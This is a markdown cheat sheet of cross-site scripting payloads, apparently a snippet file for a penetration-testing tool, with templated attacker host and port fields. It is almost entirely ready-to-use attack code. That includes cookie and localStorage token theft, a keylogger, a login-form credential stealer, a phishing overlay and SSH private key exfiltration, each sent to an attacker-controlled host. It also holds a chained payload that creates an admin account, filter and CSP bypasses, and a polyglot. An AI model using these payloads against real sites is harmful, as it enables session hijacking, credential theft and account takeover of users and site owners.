# XSS Payloads

> Cross-Site Scripting payloads — basic, filter bypass, polyglot, blind, DOM, exfil

<!-- tags: xss, web, payload, exploit, javascript, html -->

---

## xss alert basic
Confirm reflection with classic alert popup.

```bash
echo "<script>alert(1)</script>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,basic,reflected -->

---

## xss img onerror
Trigger JS via broken image tag — works when `<script>` is filtered.

```bash
echo "<img src=x onerror=alert(1)>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,img,onerror -->

---

## xss svg onload
SVG-based payload bypasses many filters.

```bash
echo "<svg onload=alert(1)>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,svg,onload -->

---

## xss body onload
Triggers when body loads. Useful in stored XSS.

```bash
echo "<body onload=alert(1)>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,body,onload -->

---

## xss cookie steal img
Exfiltrate document.cookie to attacker host.

```bash
echo "<img src=x onerror=\"fetch('http://{{LHOST:ip}}:{{LPORT:port:8000}}/?c='+document.cookie)\">"
```

<!-- meta: risk=med | phase=exploit | tags=xss,cookie,exfil,steal -->

---

## xss external script
Load remote JS payload — useful for large/complex hooks.

```bash
echo "<script src=\"http://{{LHOST:ip}}:{{LPORT:port:8000}}/xss.js\"></script>"
```

<!-- meta: risk=med | phase=exploit | tags=xss,external,hook -->

---

## xss form breakout
Close a hostile form/input and inject a script tag.

```bash
echo "\"></form><script src=\"http://{{LHOST:ip}}:{{LPORT:port:8000}}/xss.js\"></script><form action=\""
```

<!-- meta: risk=med | phase=exploit | tags=xss,formbreak,injection -->

---

## xss cookie steal hook
Hosted JS payload for above script tag.

```bash
echo 'new Image().src="http://{{LHOST:ip}}:{{LPORT:port:8000}}/?c="+document.cookie;'
```

<!-- meta: risk=med | phase=exploit | tags=xss,hook,cookie -->

---

## xss localstorage exfil
Steal localStorage contents (often holds JWT/tokens).

```bash
echo "<script>fetch('http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d='+btoa(JSON.stringify(localStorage)))</script>"
```

<!-- meta: risk=med | phase=exploit | tags=xss,localstorage,jwt,token -->

---

## xss keylogger
Capture keystrokes from focused page.

```bash
echo "<script>document.onkeypress=function(e){fetch('http://{{LHOST:ip}}:{{LPORT:port:8000}}/?k='+String.fromCharCode(e.which))}</script>"
```

<!-- meta: risk=high | phase=exploit | tags=xss,keylogger -->

---

## xss steal form submit
Hijack form submission and exfil credentials.

```bash
echo "<script>document.forms[0].onsubmit=function(){fetch('http://{{LHOST:ip}}:{{LPORT:port:8000}}/?u='+document.forms[0].username.value+'&p='+document.forms[0].password.value)}</script>"
```

<!-- meta: risk=high | phase=exploit | tags=xss,credstealer,form -->

---

## xss html login form
Phish credentials by overlaying fake login.

```bash
echo "<div style=position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999><form action=http://{{LHOST:ip}}:{{LPORT:port:8000}}/><input name=user><input type=password name=pass><input type=submit></form></div>"
```

<!-- meta: risk=high | phase=exploit | tags=xss,phishing,html -->

---

## xss bypass no spaces
Use tab characters when spaces are filtered.

```bash
echo "<svg/onload=alert(1)>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,bypass,nospace -->

---

## xss bypass mixed case
Bypass case-sensitive blacklists.

```bash
echo "<ScRiPt>alert(1)</ScRiPt>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,bypass,case -->

---

## xss bypass unicode entities
Encode tag chars in HTML entities.

```bash
echo "&lt;script&gt;alert(1)&lt;/script&gt;"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,bypass,entity -->

---

## xss bypass javascript uri
Bypass via href/src JS protocol.

```bash
echo "<a href=\"javascript:alert(1)\">click</a>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,bypass,javascript-uri -->

---

## xss polyglot
Universal polyglot that fires across many contexts.

```bash
echo 'jaVasCript:/*-/*`/*\`/*'"'"'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'
```

<!-- meta: risk=med | phase=exploit | tags=xss,polyglot,bypass -->

---

## xss iframe srcdoc
Inject content into an iframe to bypass CSP for inline scripts.

```bash
echo "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
```

<!-- meta: risk=med | phase=exploit | tags=xss,iframe,srcdoc -->

---

## xss dom hash
Trigger via location.hash sink.

```bash
echo "{{URL:url:http://target.htb/page#}}<img src=x onerror=alert(1)>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,dom,hash -->

---

## xss blind beacon
Probe for stored/blind XSS via callback host.

```bash
echo "<script src=\"https://{{XSSHUNTER:str:xss.report/c/yourid}}\"></script>"
```

<!-- meta: risk=med | phase=exploit | tags=xss,blind,stored -->

---

## xss csrf token steal
Read CSRF token then trigger privileged action.

```bash
echo "<script>fetch('/admin').then(r=>r.text()).then(t=>{var token=t.match(/csrf-token\" content=\"([^\"]+)/)[1];fetch('/admin/createUser',{method:'POST',headers:{'X-CSRF-Token':token,'Content-Type':'application/x-www-form-urlencoded'},body:'user={{USERNAME:str:pwn}}&pass={{PASSWORD:str:pwn}}&role=admin'})}</script>"
```

<!-- meta: risk=high | phase=exploit | tags=xss,csrf,chain -->

---

## xss angularjs sandbox escape
Old AngularJS template injection.

```bash
echo "{{constructor.constructor('alert(1)')()}}"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,angular,template -->

---

## xss vuejs template injection
Vue.js client-side template injection.

```bash
echo "{{_openBlock.constructor('alert(1)')()}}"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,vue,template -->

---

## xss markdown injection
XSS via Markdown link href.

```bash
echo "[xss](javascript:alert(1))"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,markdown -->

---

## xss pdf injection
Inject JS into PDF rendering libraries.

```bash
echo "<script>app.alert(1)</script>"
```

<!-- meta: risk=safe | phase=exploit | tags=xss,pdf -->

---

## xss steal ssh keys fetch
Pivot to file read using fetch on local endpoints.

```bash
echo "<script>fetch('file:///home/user/.ssh/id_rsa').then(r=>r.text()).then(d=>fetch('http://{{LHOST:ip}}:{{LPORT:port:8000}}/?k='+btoa(d)))</script>"
```

<!-- meta: risk=high | phase=exploit | tags=xss,exfil,ssh -->
